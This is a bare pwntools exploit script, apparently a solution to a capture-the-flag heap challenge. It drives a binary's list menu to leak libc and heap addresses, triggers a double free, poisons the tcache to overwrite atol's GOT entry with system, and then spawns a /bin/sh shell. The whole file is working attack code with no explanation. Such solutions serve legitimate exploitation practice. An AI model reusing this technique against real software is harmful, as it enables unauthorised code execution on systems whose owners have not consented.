from pwn import *

elf = ELF('./chall')
libdiylist = ELF('./libdiylist.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
p = process('./chall')

dict_vtype = { k:str(n) for n,k in enumerate( ['l', 'd', 's'], 1 ) }

def list_add( vtype, data ):
    p.sendlineafter('> ', '1' )
    p.sendlineafter(': ', dict_vtype[vtype] )
    p.sendlineafter(': ', data )
    print( 'add => list(%s): %s'%( vtype, data) )

def list_get( vtype, idx ):
    p.sendlineafter('> ', '2' )
    p.sendlineafter(': ', str( idx ) )
    p.sendlineafter(': ', dict_vtype[vtype] )
    p.recvuntil('Data: ')
    d = int( p.recvline().split(b'\n')[0] ) if vtype == 'l' else u64( p.recvline().split( b'\n')[0].ljust(8, b'\x00' ) )
    print( 'get => list[%d](%s): %s'%( idx, vtype, d ) )
    return d

def list_edit( vtype, idx, data ):
    p.sendlineafter('> ', '3' )
    p.sendlineafter(': ', str(idx) )
    p.sendlineafter(': ', dict_vtype[vtype] )
    p.sendlineafter(': ', data )
    print('edit => edit[%s](%s): %s'%( str(idx), vtype, data ) )

def list_del( idx ):
    p.sendlineafter('> ', '4' )
    p.sendlineafter(': ', str( idx ) )
    print( 'del => list[%d]'%idx )


#libc leak
list_add( 'l', str(elf.got['puts']) )
libc_puts = list_get( 's', 0 )
libc_base = libc_puts - libc.symbols['puts']
info( 'libc_base: 0x%x', libc_base )

#heap leak
list_add( 's', 'aaaa' )
addr_heap = list_get( 'l', 1 )
info('heap address: 0x%x'%addr_heap )

#double free
list_edit( 'l', 0, str(addr_heap) )
list_del( 1 )
list_del( 0 )

#tcache poisoning
list_add('s', p64( elf.got['atol'] ) )

list_add('s', 'bbbb' )
list_add('s', p64( libc_base + libc.symbols['system'] ) )

#get shell
list_add('l', '/bin/sh\0' )

p.interactive()
